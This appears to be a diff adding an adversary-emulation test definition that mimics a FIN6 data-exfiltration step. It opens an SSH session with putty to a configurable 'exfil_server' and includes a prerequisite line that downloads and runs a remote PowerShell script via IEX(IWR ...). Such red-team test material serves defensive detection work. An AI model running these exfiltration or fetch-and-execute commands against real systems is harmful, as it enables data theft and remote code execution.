@@ -1,0 +1,53 @@
+- id: 78d94199-7e0e-442b-81a6-32f8e419a7ac
+  name: Exfiltrate Data via SSH
+  description: Initiate an interactive SSH session with a remote server
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage'
+  cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_exfiltration
+  procedure_step: '4.2'
+  platforms:
+    windows:
+      cmd:
+        command: |
+          putty.exe -ssh #{user}@#{exfil_server}
+        payloads:
+        - putty.exe
+  input_arguments:
+    putty_exe:
+      description: Path of putty.exe
+      type: Path
+      default: C:\ProgramData\putty.exe
+    putty_url:
+      description: Path to download putty file
+      type: URL
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
+    putty_hash:
+      description: File hash of the putty exe file
+      type: String
+      default: 961B36BB78D27B3432FAE08E5C4272FE295B5E24E832C6F6BF1EC3CF87057DAB
+    user:
+      description: username
+      type: string
+      default: wardog
+    exfil_server:
+      description: hostname or IP address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: putty.exe must exist on disk at specified location (#{putty_exe})
+    prereq_command: if (Test-Path \#{putty_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{putty_exe}"; $zippath = "$parentpath\putty.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{putty_url}" "$zippath" \#{putty_hash}) {
+      Expand-Archive $zippath $parentpath\putty -Force
+      Move-Item $parentpath\putty\putty.exe "#{putty_exe}"
+      Remove-Item $zippath, $parentpath\putty -Recurse
+      }
+  executors:
+  - name: command_prompt
+    command: "putty.exe -ssh #{user}@#{exfil_server}"
